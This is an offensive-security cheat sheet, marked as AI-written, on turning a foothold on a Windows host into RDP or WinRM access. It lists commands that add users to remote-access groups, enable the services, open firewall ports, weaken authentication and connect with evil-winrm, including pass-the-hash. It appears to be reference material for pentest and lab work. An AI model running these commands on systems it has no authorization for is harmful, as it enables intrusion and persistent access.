---
note_tags:
  - rdp
  - winrm
  - foothold
  - remote-desktop
  - powershell
  - evil-winrm
  - xfreerdp
---
# Enable RDP / WinRM

**Author:** Julien Bongars\
**Date:** 2026-08-26
**Path:**

---

> **EDITOR NOTE**
>
> This page was created 100% with AI as a disclosure.

You have a foothold (webshell, reverse shell, RunAs, stolen local-admin token). Prefer a **front-door** session over living in that shell: WinRM (5985/5986) for a proper PowerShell prompt, RDP (3389) for a desktop.

Needs **local admin** (or already being in `Remote Management Users` / `Remote Desktop Users` with the service already on). Client commands: [RDP](./rdp.md), [xfreerdp](./xfreerdp.md). Native enum while you are in: [PowerShell enumeration](../../enumeration/windows/powershell-enumeration.md). Windows order of operations: [Windows pivot — WinRM first](../../lateral/tunneling/windows-pivot.md).

## 0. Is it already on?

```powershell
whoami /all
Get-Service TermService, WinRM | format-table Name, Status, StartType
Test-WSMan
Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections
Get-NetTCPConnection -State Listen | ? { $_.LocalPort -in 3389,5985,5986 }
```

```cmd
netstat -ano | findstr "3389 5985 5986"
net localgroup "Remote Desktop Users"
net localgroup "Remote Management Users"
```

If 5985 is listening and you are in **Remote Management Users** (or Administrators), skip enable — connect. Same for 3389 + **Remote Desktop Users**.

## 1. Add your user to the right group

```cmd
net localgroup "Remote Management Users" USER /add
net localgroup "Remote Desktop Users" USER /add
```

Domain:

```cmd
net localgroup "Remote Management Users" DOMAIN\USER /add
net localgroup "Remote Desktop Users" DOMAIN\USER /add
```

Administrators already get both. Restricted / low-priv users do not.

## 2. Enable WinRM (5985)

```powershell
Enable-PSRemoting -Force
# older boxes:
winrm quickconfig -quiet

Enable-NetFirewallRule -DisplayGroup "Windows Remote Management"
Start-Service WinRM
Set-Service WinRM -StartupType Automatic
```

Lab-only if `evil-winrm` still fails on auth/encryption (do not leave this on a real network):

```powershell
Set-Item WSMan:\localhost\Service\Auth\Basic -Value $true
Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $true
```

Connect from the attacker box:

```bash
evil-winrm -i TARGET -u USER -p 'PASS'
evil-winrm -i TARGET -u USER -H NTLMHASH
nxc winrm TARGET -u USER -p 'PASS'
```

## 3. Enable RDP (3389)

```powershell
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
Start-Service TermService
Set-Service TermService -StartupType Automatic
```

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net start TermService
```

NLA blocking the client (lab):

```powershell
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name UserAuthentication -Value 0
```

Connect: [RDP](./rdp.md) / [xfreerdp](./xfreerdp.md).

```bash
xfreerdp /v:TARGET /u:USER /p:'PASS' /cert:ignore /clipboard /dynamic-resolution
nxc rdp TARGET -u USER -p 'PASS'
```

## 4. Firewall still blocking

Service up, port closed from outside:

```powershell
New-NetFirewallRule -DisplayName "RDP 3389" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow
New-NetFirewallRule -DisplayName "WinRM 5985" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow
```

```cmd
netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
netsh advfirewall firewall add rule name="WinRM" dir=in action=allow protocol=TCP localport=5985
```

If the box is only reachable from an internal net, pivot first ([ligolo-ng](../../lateral/tunneling/ligolo-ng.md), [chisel](../../lateral/tunneling/chisel.md), [SSH tunneling](../../lateral/tunneling/port-forwarding.md)).

## Resources

- [RDP](./rdp.md) — xfreerdp / Remmina / NLA / drive share
- [xfreerdp](./xfreerdp.md) — client flags
- [Enable-PSRemoting](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting) — WinRM listener
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) — WinRM client
- [PowerShell enumeration](../../enumeration/windows/powershell-enumeration.md) — once you have a real prompt
- [nxc](../password_spray/nxc.md) — `nxc winrm` / `nxc rdp` check
- [ligolo-ng](../../lateral/tunneling/ligolo-ng.md) — if 3389/5985 are only on an internal net
- [chisel](../../lateral/tunneling/chisel.md) — HTTP tunnel / SOCKS
- [SSH tunneling](../../lateral/tunneling/port-forwarding.md) — `-L` / `-D`
- [Windows pivot — WinRM first](../../lateral/tunneling/windows-pivot.md) — order of operations
